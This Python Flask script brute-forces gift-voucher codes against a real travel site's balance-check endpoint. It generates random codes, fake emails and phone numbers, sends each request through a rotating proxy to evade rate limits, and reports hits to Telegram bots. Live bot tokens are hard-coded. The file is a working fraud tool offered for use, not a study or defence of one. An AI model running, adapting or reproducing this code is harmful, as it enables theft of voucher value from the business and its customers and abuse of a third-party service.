import random
import string
import requests
from flask import Flask, jsonify
import json
import threading
import time
import os

app = Flask(__name__)

# Global request counter
request_count = 0

# Helper function to generate random email
def generate_random_email():
    email_prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    return f"{email_prefix}@gmail.com"

# Helper function to generate random phone number
def generate_random_phone():
    phone = "9" + ''.join(random.choices(string.digits, k=9))  # Phone number starting with '9'
    return phone

# Helper function to generate random voucher code
def generate_random_voucher_code():
    return "Y2GTV" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

# Function to send message to Telegram bot
def send_telegram_message(url, message):
    telegram_url = f"{url}&text={message}"
    requests.get(telegram_url)

# API request function
def send_api_request(proxy=None):
    global request_count
    # Define the URL and payload
    url = "https://secure.yatra.com/PaySwift/gift-voucher/yatra/dom2/1611240003969/check-balance"

    payload = {
        "superPnr": "1611240003969",
        "emailId": generate_random_email(),
        "amount": 13191,
        "lob": "AIR",
        "isd": "91",
        "mobile": generate_random_phone(),
        "source": "YT",
        "context": "REVIEW",
        "vouchers": [{"code": generate_random_voucher_code(), "type": "PROMO", "pin": ""}]
    }

    headers = {
        'scheme': 'https',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '226',
        'content-type': 'application/json',
        'origin': 'https://secure.yatra.com',
        'referer': 'https://secure.yatra.com/PaySwift/payment',
        'sec-ch-ua': '"-Not.A/Brand";v="8", "Chromium";v="102"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest'
    }

    # If a proxy is provided, use it in the request
    proxies = None
    if proxy:
        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }

    # Send API request
    response = requests.post(url, headers=headers, data=json.dumps(payload), proxies=proxies)

    # Process the response
    response_data = response.json()

    if response_data.get('resCode') == 1:  # Failed response
        failed_message = f"CODE: {payload['vouchers'][0]['code']}\nAPI Response:\n{json.dumps(response_data, indent=4)}"
        send_telegram_message("https://api.telegram.org/bot5453678885:AAGAmj13cf0BrWUuvqNb4Nemc2zFR4IhpTw/sendmessage?chat_id=-871155395", failed_message)
    elif response_data.get('resCode') == 0:  # Success response
        success_message = f"Success: Voucher Code {payload['vouchers'][0]['code']} - Amount: {response_data['amount']}"
        send_telegram_message("https://api.telegram.org/bot5443217673:AAG2JGtn3gPGJ8UzKnTW2-l-p4tPt0A2NvQ/sendmessage?chat_id=-1001660096246", success_message)
    
    # Increment the request count
    request_count += 1

# Function to run the request in an infinite loop
def run_infinite_loop():
    # Read the proxies from the file
    with open('proxies.txt', 'r') as file:
        proxies = file.readlines()

    while True:
        try:
            proxy = random.choice(proxies).strip()  # Randomly pick a proxy from the file
            send_api_request(proxy)  # Send the API request using the selected proxy
            time.sleep(5)  # Wait for 5 seconds before sending the next request
        except Exception as e:
            print(f"Error in sending request: {e}")
            time.sleep(5)  # Wait for a while before retrying

# Flask route
@app.route('/', methods=['GET'])
def check_voucher():
    return jsonify({"status": f"Requests sent: {request_count}"})

if __name__ == '__main__':
    # Start the infinite loop in a background thread
    loop_thread = threading.Thread(target=run_infinite_loop)
    loop_thread.daemon = True  # Daemonize the thread so it will exit when the main program exits
    loop_thread.start()

    # Get the port from the environment, defaulting to 5000 if not found
    port = int(os.environ.get('PORT', 5000))
    # Start the Flask app
    app.run(debug=True, host='0.0.0.0', port=port)
